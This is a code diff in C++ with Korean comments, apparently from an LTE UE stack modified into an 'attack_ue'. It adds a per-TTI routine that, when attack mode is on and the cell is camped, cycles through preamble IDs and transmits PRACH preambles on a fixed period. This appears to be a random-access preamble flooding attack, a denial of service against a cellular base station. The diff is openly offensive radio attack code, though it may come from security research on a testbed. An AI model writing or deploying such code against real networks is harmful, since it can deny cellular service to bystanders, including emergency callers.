@@ -134,6 +134,56 @@ void attack_ue::set_nof_preambles(uint32_t nof_preambles)
   logger.info("Number of preambles set to %d", nof_preambles);
 }
 
+void attack_ue::step_tti(uint32_t tti)
+{
+  // 공격 모드가 비활성화되었으면 처리하지 않음
+  if (!attack_mode_enabled.load() || !running.load()) {
+    return;
+  }
+
+  // phy_h가 null인지 확인
+  if (!phy_h) {
+    return;
+  }
+
+  // 셀 캠핑 상태 확인 (phy_interface_stack_lte로 캐스팅)
+  phy_interface_stack_lte* phy_stack = dynamic_cast<phy_interface_stack_lte*>(phy_h);
+  if (phy_stack && !phy_stack->cell_is_camping()) {
+    // 셀이 캠핑되지 않았으면 처리하지 않음
+    return;
+  }
+
+  // PRACH 주기 계산 (TTI는 1ms 단위, prach_period_ms는 ms 단위)
+  // 예: prach_period_ms=20이면 20 TTI마다 PRACH 준비
+  uint32_t period_tti;
+  {
+    std::lock_guard<std::mutex> lock(ctx.mutex);
+    period_tti = ctx.prach_period_ms; // 1 TTI = 1ms
+  }
+
+  // 주기마다 PRACH 준비
+  if (tti % period_tti == 0) {
+    // RAPID 선택 (순환)
+    uint32_t rapid = current_rapid.load();
+    uint32_t next_rapid = (rapid + 1) % ctx.nof_preambles;
+    current_rapid.store(next_rapid);
+
+    // PRACH 송신
+    float target_power_dbm = -100.0f;
+    int allowed_subframe = -1;
+
+    logger.debug("TX (TTI=%d): Calling phy_h->prach_send(rapid=%d)", tti, rapid);
+
+    phy_h->prach_send(rapid, allowed_subframe, target_power_dbm);
+
+    // 활성 RAPID 목록에 추가
+    {
+      std::lock_guard<std::mutex> lock(ctx.mutex);
+      ctx.active_rapids.insert(rapid);
+    }
+  }
+}
+
 void attack_ue::tx_prach_thread()
 {
   logger.info("TX PRACH thread started");
@@ -146,6 +196,15 @@ void attack_ue::tx_prach_thread()
     // phy_h가 null인지 확인
     if (!phy_h) {
       logger.error("PHY interface is null, cannot send PRACH");
+      std::this_thread::sleep_for(std::chrono::milliseconds(100));
+      continue;
+    }
+
+    // 셀 캠핑 상태 확인 (phy_interface_stack_lte로 캐스팅)
+    phy_interface_stack_lte* phy_stack = dynamic_cast<phy_interface_stack_lte*>(phy_h);
+    if (phy_stack && !phy_stack->cell_is_camping()) {
+      // 셀이 캠핑되지 않았으면 대기
+      logger.debug("TX: Cell not camping yet, waiting...");
       std::this_thread::sleep_for(std::chrono::milliseconds(100));
       continue;
     }
